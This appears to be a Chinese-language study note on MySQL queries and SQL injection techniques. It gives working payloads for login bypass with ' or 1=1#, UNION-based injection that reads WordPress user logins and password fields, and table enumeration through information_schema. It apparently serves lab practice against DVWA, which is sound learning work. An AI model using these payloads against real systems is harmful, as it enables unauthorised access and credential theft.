select use();
select database();
select now();


大写 按tab可以补全

show create table users\G


字符串的查询需要加引号
select user,password from mysql.user where user = 'root';
若不加引号，代表查询的字段

数字是不可以作为字段的

#### 基于错误注入
比如：在用户名输入框中输入:’ or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为：
select * from users where username='' or 1=1#' and password=md5('')
　　语义分析：“#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：
select * from users where username='' or 1=1#' and password=md5('')
等价于
select * from users where username='' or 1=1



#### 基于or的注入 获取一个表
select user,password from mysql.user where user = 'root' or 1=1；
where后的条件为真


#### 基于union的注入 获取多个表
union前后字段数量一致

如果对union前的不关注则利用假的条件
例如：
select * from dvwa.users where 1=2 union select user_login,user_pwd,1,2 from wordpress.wp_users;
字段字段不一致，则可以不停的增减字段数尝试
如关注前面的数据则不使用where的假条件


#### information_schema (数据库字典)
查看数据库中所有的表
select * from information_schema.tables\G

查看去重后的所有数据库
select DISTINCT TABLE_SCHEMA from information_schema.tables;
等同于 showdatabases;

select TABLE_SCHEMA，TABLE_NAME from information_schema.tables WHERE TABLE_SCHEMA='HH';

select TABLE_SCHEMA，GROUP_CONCAT(TABLE_NAME) from information_schema.tables GROUP BY TABLE_SCHEMA;

通过前面获取的库与表获取表中的所有列
select COLOUMN_NAME from information_schema.columns WHERE TABLE_SCHEMA='database' and TABLE_NAME='table';


#### 参考文章
- [利用SQL注入漏洞登录后台](https://www.cnblogs.com/sdya/p/4568548.html)
